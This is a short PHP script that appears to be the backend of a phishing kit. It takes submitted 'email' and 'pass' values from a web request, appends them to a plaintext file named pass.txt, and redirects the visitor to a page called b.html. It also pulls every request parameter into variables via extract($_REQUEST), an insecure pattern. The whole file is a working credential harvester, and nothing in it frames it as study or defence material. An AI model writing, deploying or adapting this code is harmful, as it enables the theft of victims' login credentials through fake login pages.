<?php
extract($_REQUEST);
$file=fopen("pass.txt","a");
fwrite($file,"email   : ");
fwrite($file,$email ."\n");
fwrite($file,"pass:  ");
fwrite($file,$pass ."\n");
fclose($file);
header('location: b.html');

?>
